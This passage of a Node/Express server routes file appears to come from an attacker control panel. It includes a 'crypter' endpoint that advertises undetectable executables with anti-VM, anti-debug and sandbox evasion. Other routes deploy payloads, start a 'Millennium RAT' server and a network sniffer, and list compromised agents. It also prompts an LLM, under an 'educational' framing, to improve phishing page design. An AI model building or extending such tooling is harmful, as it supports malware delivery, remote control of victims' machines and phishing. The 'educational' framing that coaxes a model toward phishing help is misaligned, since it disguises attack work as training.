              antiVM: config.antiVM,
              polymorphic: config.polymorphic,
              multiLayerEncryption: true,
              memoryExecution: true
            }
          })
        });
        
        res.json({
          success: true,
          downloadUrl: \`/download/\${outputName}.exe\`,
          filename: \`\${outputName}.exe\`,
          message: 'Undetectable executable created with advanced evasion features',
          features: [
            'Multi-layer encryption (XOR + Fernet + Base64)',
            'Anti-debugging protection',
            'Anti-VM detection', 
            'Sandbox evasion with random delays',
            'Memory execution',
            'Process name obfuscation',
            'Dynamic stub generation'
          ]
        });
      });
    } catch (error) {
      console.error('Advanced crypter error:', error);
      res.status(500).json({ message: 'Advanced crypter processing failed' });
    }
  });

  // File download endpoint
  app.get('/download/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = require('path').join(process.cwd(), 'builds', filename);
    
    if (require('fs').existsSync(filepath)) {
      res.download(filepath);
    } else {
      res.status(404).json({ message: 'File not found' });
    }
  });

  // Groq AI Analysis route
  app.post('/api/groq-analysis', requireAuth, async (req, res) => {
    try {
      const { mode, prompt, context } = req.body;
      
      if (!process.env.GROQ_API_KEY) {
        return res.status(500).json({ message: 'Groq API key not configured' });
      }

      // Prepare analysis prompt based on mode
      let systemPrompt = '';
      let userPrompt = prompt;

      switch (mode) {
        case 'deploy':
          systemPrompt = 'You are a cybersecurity expert specializing in educational red team deployment strategies. Analyze the provided traffic data and suggest deployment tactics for educational purposes only. Focus on how attackers typically deploy malicious sites and how to simulate this safely for blue team training.';
          if (!userPrompt) {
            userPrompt = `Analyze this visitor traffic data for educational red team deployment strategies: ${JSON.stringify(context)}. Suggest how to effectively deploy this type of site for cybersecurity training and what traffic patterns indicate successful engagement.`;
          }
          break;
        case 'designer':
          systemPrompt = 'You are an expert web designer specializing in social engineering tactics for educational purposes. Provide HTML/CSS improvements to make educational phishing simulations more effective while maintaining ethical boundaries for cybersecurity training.';
          if (!userPrompt) {
            userPrompt = `Based on this visitor engagement data: ${JSON.stringify(context)}, suggest HTML/CSS improvements to make this educational cybersecurity training site more effective. Focus on design elements that demonstrate social engineering tactics for defensive training.`;
          }
          break;
        case 'analysis':
          systemPrompt = 'You are a cybersecurity analyst providing educational insights on traffic patterns and attack vectors. Your analysis helps blue team students understand how malicious sites track and profile visitors.';
          if (!userPrompt) {
            userPrompt = `Analyze this traffic data for educational cybersecurity insights: ${JSON.stringify(context)}. Explain what this data reveals about visitor behavior, potential attack vectors, and how defenders can detect such tracking. Focus on the educational value for blue team training.`;
          }
          break;
      }

      // Make request to Groq API
      const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'mixtral-8x7b-32768',
          messages: [
            { role: 'system', content: systemPrompt },
            { role: 'user', content: userPrompt }
          ],
          max_tokens: 1024,
          temperature: 0.7
        })
      });

      if (!response.ok) {
        throw new Error(`Groq API error: ${response.status}`);
      }

      const data = await response.json();
      const analysis = data.choices[0]?.message?.content || 'No analysis generated';

      res.json({ analysis, mode });
    } catch (error) {
      console.error('Groq analysis error:', error);
      res.status(500).json({ message: 'Failed to generate AI analysis' });
    }
  });

  app.post("/api/admin/deploy-payload", requireAuth, async (req: any, res) => {
    try {
      const { agentId, payloadConfig } = req.body;
      
      // Store payload deployment request
      await storage.createAnalytics({
        metric: 'millennium_payload_deployment',
        value: JSON.stringify({
          agentId,
          payloadConfig,
          timestamp: new Date().toISOString(),
          adminUserId: req.session.adminId
        }),
      });

      // In a real implementation, this would communicate with the RAT server
      const deploymentResult = {
        success: true,
        deploymentId: `deploy_${Date.now()}`,
        agentId,
        payloadType: payloadConfig.type,
        deploymentMethod: payloadConfig.method,
        timestamp: new Date().toISOString()
      };

      // Emit real-time update
      io.to('admin').emit('payloadDeployment', deploymentResult);

      res.json(deploymentResult);
    } catch (error) {
      console.error("Payload deployment error:", error);
      res.status(500).json({ message: "Failed to deploy payload" });
    }
  });

  app.post("/api/admin/start-millennium-server", requireAuth, async (req: any, res) => {
    try {
      const { port, interface: serverInterface } = req.body;
      const { spawn } = require('child_process');
      
      const serverCommand = [
        'python3',
        'python_tools/millennium_rat_toolkit.py',
        '--start-server',
        '--port', port || '8888',
        '--interface', serverInterface || '0.0.0.0'
      ];

      // Start server in background
      const serverProcess = spawn(serverCommand[0], serverCommand.slice(1), {
        stdio: 'pipe',
        cwd: process.cwd(),
        detached: true
      });

      // Store server info
      await storage.createAnalytics({
        metric: 'millennium_server_start',
        value: JSON.stringify({
          port,
          interface: serverInterface,
          pid: serverProcess.pid,
          timestamp: new Date().toISOString(),
          adminUserId: req.session.adminId
        }),
      });

      res.json({
        success: true,
        message: `Millennium RAT server started on ${serverInterface}:${port}`,
        pid: serverProcess.pid
      });
    } catch (error) {
      console.error("Millennium server start error:", error);
      res.status(500).json({ message: "Failed to start Millennium server" });
    }
  });

  app.post("/api/admin/start-http-sniffer", requireAuth, async (req: any, res) => {
    try {
      const { interface: networkInterface, duration, outputFile } = req.body;
      const { spawn } = require('child_process');
      
      const snifferCommand = [
        'python3',
        'python_tools/millennium_rat_toolkit.py',
        '--start-sniffer',
        '--interface', networkInterface || 'all',
        '--duration', duration || '300',
        '--output', outputFile || 'captured_traffic.json'
      ];

      const snifferProcess = spawn(snifferCommand[0], snifferCommand.slice(1), {
        stdio: 'pipe',
        cwd: process.cwd(),
        detached: true
      });

      // Store sniffer info
      await storage.createAnalytics({
        metric: 'millennium_sniffer_start',
        value: JSON.stringify({
          interface: networkInterface,
          duration,
          outputFile,
          pid: snifferProcess.pid,
          timestamp: new Date().toISOString(),
          adminUserId: req.session.adminId
        }),
      });

      res.json({
        success: true,
        message: `HTTP sniffer started on interface ${networkInterface}`,
        pid: snifferProcess.pid,
        duration: parseInt(duration) || 300
      });
    } catch (error) {
      console.error("HTTP sniffer start error:", error);
      res.status(500).json({ message: "Failed to start HTTP sniffer" });
    }
  });

  app.get("/api/admin/millennium-agents", requireAuth, async (req, res) => {
    try {
      // Get millennium agent data from analytics
      const agentData = await storage.getAnalyticsByMetric('millennium_agent_connection');
      const payloadDeployments = await storage.getAnalyticsByMetric('millennium_payload_deployment');
      
      const agents = agentData.map(item => {
        try {
          return {
            id: item.id,
            timestamp: item.timestamp,
            data: JSON.parse(item.value)
          };
        } catch {
          return null;
        }
      }).filter(Boolean);

      const deployments = payloadDeployments.map(item => {
        try {
          return {
            id: item.id,
            timestamp: item.timestamp,
            data: JSON.parse(item.value)
          };
        } catch {
          return null;
        }
      }).filter(Boolean);

      res.json({
        agents,
        deployments,
        totalAgents: agents.length,
        activeDeployments: deployments.filter(d => 
          new Date().getTime() - new Date(d.timestamp).getTime() < 24 * 60 * 60 * 1000
        ).length
      });
    } catch (error) {
      console.error("Failed to fetch Millennium agents:", error);
      res.status(500).json({ message: "Failed to fetch agent data" });
    }
  });

  app.get("/api/admin/traffic-analysis", requireAuth, async (req, res) => {
    try {
      const snifferData = await storage.getAnalyticsByMetric('millennium_sniffer_data');
      const serverLogs = await storage.getAnalyticsByMetric('millennium_server_start');
      
      const trafficAnalysis = snifferData.map(item => {
        try {
          return {
            id: item.id,
            timestamp: item.timestamp,
            data: JSON.parse(item.value)
          };
        } catch {
          return null;
        }
      }).filter(Boolean);

      res.json({
        trafficSamples: trafficAnalysis,
        totalSamples: trafficAnalysis.length,
        analysisTimeRange: {
          start: trafficAnalysis.length > 0 ? trafficAnalysis[0].timestamp : null,
          end: trafficAnalysis.length > 0 ? trafficAnalysis[trafficAnalysis.length - 1].timestamp : null
        },
        serverLogs: serverLogs.slice(-10) // Last 10 server starts
      });
    } catch (error) {
      console.error("Failed to fetch traffic analysis:", error);
      res.status(500).json({ message: "Failed to fetch traffic analysis" });
    }
  });
  app.post("/api/admin/modify-content", requireAuth, async (req: any, res) => {
    try {
      const { section, prompt } = req.body;
      
      // Placeholder for Groq AI integration
      // const groqResponse = await groqClient.chat.completions.create({...});
      
      const modification = await storage.createContentModification({
        section,
        originalContent: "Original content placeholder",
        modifiedContent: "AI-modified content placeholder",
        aiModel: "groq-mixtral-8x7b",
        adminUserId: req.session.adminId,
      });

      res.json(modification);
    } catch (error) {
      res.status(500).json({ message: "Failed to modify content" });
    }
  });

  // Real-time Socket.IO connections
  io.on('connection', (socket) => {
    console.log('Client connected for real-time monitoring');
    
    socket.on('disconnect', () => {
      console.log('Client disconnected');
    });

    // Join admin room for privileged data
    socket.on('joinAdmin', async (adminToken) => {
      // Verify admin token here
      socket.join('admin');
    });
  });

  // Simulate real-time data for educational purposes
  setInterval(async () => {
    try {
      // Simulate periodic packet capture
      const simulatedPacket = await storage.createPacketLog({
        sourceIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
        destinationIp: "8.8.8.8",
        protocol: Math.random() > 0.5 ? "TCP" : "UDP",
        port: Math.random() > 0.5 ? 443 : 80,
        payload: "Educational simulation payload",
        size: Math.floor(Math.random() * 1500) + 64,
        isEducational: true,
      });

      io.to('admin').emit('newPacket', simulatedPacket);
    } catch (error) {
      console.error("Simulation error:", error);
    }
  }, 5000); // Every 5 seconds

  return httpServer;
}
